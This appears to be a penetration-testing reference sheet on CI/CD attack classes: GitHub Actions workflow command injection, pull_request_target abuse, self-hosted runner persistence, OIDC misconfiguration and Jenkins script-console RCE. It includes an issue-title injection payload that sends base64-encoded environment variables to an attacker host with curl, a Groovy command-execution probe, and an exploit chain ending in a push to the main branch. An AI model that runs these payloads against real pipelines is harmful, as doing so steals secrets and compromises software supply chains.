# CI/CD Pipeline & GitHub Actions Security Reference

## Attack Surface Signals
- Public/Private repositories with `.github/workflows/*.yml`, Jenkins servers (`:8080`), GitLab CI (`.gitlab-ci.yml`), CircleCI (`.circleci/config.yml`).
- Webhook endpoints: `/github-webhook/`, `/gitlab-hook/`, `/teamcity/`.

## GitHub Actions Vulnerability Classes
1. **Workflow Command Injection (Untrusted Inputs in `run:` Steps)**:
   - Sinks: Expressions directly interpolated into shell commands:
     ```yaml
     - run: echo "Title is: ${{ github.event.issue.title }}"
     - run: git checkout ${{ github.event.pull_request.head.ref }}
     ```
   - Attack Payload: Create PR or issue title containing: `Title"; curl http://attacker.com/$(env | base64); echo "`
2. **`pull_request_target` Trigger Abuse (PwnRequest)**:
   - `pull_request_target` runs in the context of the base repository with access to repository `SECRETS` and read/write `GITHUB_TOKEN`.
   - Vulnerable if workflow explicitly checks out the untrusted fork PR code:
     ```yaml
     - uses: actions/checkout@v3
       with:
         ref: ${{ github.event.pull_request.head.sha }}
     - run: npm install && npm test  # Executes malicious code from fork
     ```
3. **Self-Hosted Runner Poisoning & Persistence**:
   - Workflows running on persistent self-hosted runners (`runs-on: self-hosted`) without ephemeral container sandboxing allow persistent backdoor installation and host network pivot.
4. **OIDC Federation Misconfiguration**:
   - AWS/GCP OIDC trust policies with overly permissive `sub` claim filters (e.g. `repo:org/*` allowing any public repo in org to assume production cloud role).

## Jenkins Exploitation Essentials
- Check `/script` (Groovy script console) for unauthenticated RCE: `println "whoami".execute().text`.
- CVE-2024-23897 (Arbitrary File Read via CLI args parser).

## Exploit Chains
- **Workflow Injection via Issue Title → Exfiltrate `GITHUB_TOKEN` & Repository Secrets → Write to Main Branch**.
